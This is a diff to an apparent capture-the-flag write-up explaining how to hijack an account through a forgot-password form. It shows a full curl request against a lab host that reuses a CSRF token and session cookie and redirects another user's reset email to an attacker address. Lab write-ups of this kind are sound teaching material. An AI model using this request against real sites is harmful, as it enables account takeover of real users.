@@ -31,7 +31,7 @@ Solution: get control of an account.
 
 Looking at the javascript and html of the `/forgotpassword.html` page revealed that there were two fields: `user` and `email`.
 If you tried to change these manually, the javascript would change them after submission.
-You could change the javascript, but the post request was easier if you could forge the csrf token.
+You could change the javascript, but the post request was easier if you could forge or properly duplicated the csrf token by not wasting it before sending the request.
 
 `curl -X POST localhost/forgotpassword.html -H 'Content-Type: application/json' -H 'Cookie: session=eyJjc3JmX3Rva2VuIjoiNzNiMjYxYTBmZTUzMGQ1ZDE2NTdjMTM2ZTg0MjFmMzBjYmZmOGE4MSJ9.Xo1kXA.lQlki-2qioMO5T2LXWJxyvv8SyE' --data '{"user": "true.grit@umbccd.io", "email": "foo.bar@boo.zaz", "csrf_token": "eyJjc3JmX3Rva2VuIjoiNzNiMjYxYTBmZTUzMGQ1ZDE2NTdjMTM2ZTg0MjFmMzBjYmZmOGE4MSJ9.Xo1kXA.lQlki-2qioMO5T2LXWJxyvv8SyE"}' | less`
 
